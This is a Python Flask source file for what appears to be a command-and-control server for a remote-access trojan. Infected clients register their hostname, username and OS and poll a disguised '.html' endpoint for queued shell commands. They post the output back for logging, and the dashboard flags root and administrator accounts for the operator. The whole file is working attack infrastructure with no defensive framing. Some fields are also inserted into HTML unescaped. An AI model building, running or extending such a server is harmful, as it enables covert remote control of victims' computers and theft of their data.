import os
from flask import Flask, request, render_template, redirect, url_for
from markupsafe import Markup
from datetime import datetime

app = Flask(__name__)

clients = {}
command_queue = {}
MAX_HISTORY = 2
HISTORY_DIR = 'history'

if not os.path.exists(HISTORY_DIR):
    os.makedirs(HISTORY_DIR)

def current_time_str():
    return datetime.now().strftime('%H:%M:%S %m/%d/%y')

def get_history(client_id):
    path = os.path.join(HISTORY_DIR, f'{client_id}.log')
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8') as f:
        lines = f.read().strip().split('\n\n')
    history = []
    for entry in lines[-MAX_HISTORY:]:
        parts = entry.split('\n', 1)
        if len(parts) == 2:
            history.append((parts[0], parts[1]))
    return history

def append_to_history(client_id, cmd, result):
    path = os.path.join(HISTORY_DIR, f'{client_id}.log')
    with open(path, 'a', encoding='utf-8') as f:
        f.write(f'{cmd}\n{result}\n\n')

@app.route('/report', methods=['POST'])
def report():
    data = request.form
    client_id = data['id']
    clients[client_id] = {
        'ip': request.remote_addr,
        'hostname': data['hostname'],
        'username': data['username'],
        'os': data['os'],
        'version': data['version'],
        'lastseen': current_time_str()
    }
    command_queue.setdefault(client_id, [])
    return 'OK', 200

@app.route('/<client_id>.html', methods=['GET'])
def serve_client_command(client_id):
    if client_id in clients:
        clients[client_id]['lastseen'] = current_time_str()
    cmds = command_queue.get(client_id, [])
    return cmds[0] if cmds else ''

@app.route('/', methods=['GET'])
def dashboard():
    return render_template('dashboard.html', clients=clients)

@app.route('/dashboard/data')
def dashboard_data():
    rows = ""
    for id, info in clients.items():
        color = 'red' if info['username'].lower() in ['root', 'admin', 'administrator', 'system'] else '#0f0'
        rows += f"""
        <tr>
            <td>{id}</td>
            <td>{info['ip']}</td>
            <td>{info['hostname']}</td>
            <td style="color:{color}">{info['username']}</td>
            <td>{info['os']}</td>
            <td>{info['version']}</td>
            <td>{info['lastseen']}</td>
            <td><a href="/client/{id}">Open</a></td>
            <td>
                <form method="POST" action="/client/{id}/delete" onsubmit="return confirm('Are you sure?');">
                    <button type="submit" style="background:none; border:1px solid red; color:red; padding:5px;">Delete</button>
                </form>
            </td>
        </tr>
        """
    return rows

@app.route('/register', methods=['POST'])
def register():
    data = request.form
    client_id = data['id']
    clients[client_id] = {
        'ip': request.remote_addr,
        'hostname': data['hostname'],
        'username': data['username'],
        'os': data['os'],
        'version': data['version'],
        'lastseen': current_time_str()
    }
    command_queue.setdefault(client_id, [])
    return 'Registered', 200

@app.route('/<client_id>/result', methods=['POST'])
def receive_result(client_id):
    cmd = request.form['cmd'].strip()
    result = request.form['result']
    if client_id in command_queue and command_queue[client_id]:
        if command_queue[client_id][0].strip() == cmd:
            command_queue[client_id].pop(0)
    append_to_history(client_id, cmd, result)
    return 'OK', 200

@app.route('/client/<client_id>/updates')
def client_updates(client_id):
    history = get_history(client_id)
    output_html = ""
    for cmd, result in history:
        safe_result = (
            result.strip()
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace(" ", "&nbsp;")
            .replace("\r\n", "<br>")
            .replace("\n", "<br>")
        )
        output_html += f'<div class="entry"><span class="cmd">{cmd}</span><br><pre>{safe_result}</pre></div>\n'
    return output_html

@app.route('/client/<client_id>', methods=['GET', 'POST'])
def client_terminal(client_id):
    if request.method == 'POST':
        cmd = request.form['cmd']
        command_queue[client_id].append(cmd)
        return redirect(url_for('client_terminal', client_id=client_id))

    history = get_history(client_id)
    return render_template('client.html', client_id=client_id, history=history)

@app.route('/client/<client_id>/delete', methods=['POST'])
def delete_client(client_id):
    if client_id in clients:
        # Send exit command to the client
        command_queue[client_id].append('exit')
        
        # Clean up the client information
        clients.pop(client_id, None)
        command_queue.pop(client_id, None)

        # Remove history file
        try:
            os.remove(os.path.join(HISTORY_DIR, f'{client_id}.log'))
        except FileNotFoundError:
            pass
        
        # You can optionally terminate the client process here by killing it if necessary
        # However, the client should handle the "exit" command and stop itself

    return redirect(url_for('dashboard'))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
